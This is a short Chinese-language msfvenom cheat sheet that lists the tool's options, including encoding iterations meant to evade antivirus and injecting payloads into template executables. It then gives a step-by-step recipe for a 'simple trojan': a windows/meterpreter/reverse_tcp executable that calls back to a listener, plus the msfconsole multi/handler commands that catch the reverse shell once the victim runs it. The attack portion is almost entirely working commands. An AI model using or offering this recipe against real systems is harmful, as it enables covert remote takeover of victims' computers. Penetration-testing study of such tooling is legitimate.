# Msfvenom
---

Options: 

-p, --payload 指定需要使用的payload。使用自定义的payload，请使用-;或者stdin指定

 -l, --list  列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all 

-n, --nopsled 为payload预先指定一个NOP滑动长度 

-f, --format  指定输出格式

-e, --encoder 指定需要使用的编码 

-a, --arch 指定payload的目标架构 x64 x86 –platform 指定payload的目标平台 

-s, --space 设定有效攻击荷载的最大长度 

-b, --bad-chars 设定规避字符集，比如: & #039;\x00\xff& #039; 

-i, --iterations 指定payload的编码次数，绕杀毒 

-c, --add-code 指定一个附加的win32 shellcode文件 

-x, --template  指定一个自定义的可执行文件作为模板 

-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行 –payload-options 列举payload的标准选项 

-o, --out  保存payload 

-v, --var-name 指定一个自定义的变量，以确定输出格式 

–shellest 最小化生成payload

---

生成简单木马

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.103 lport=4444 -f exe -o back.exe

msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set lhost 192.168.0.103

set lport 4444

exploit/run

将back.exe打开，反弹shell

meterpreter进行操作
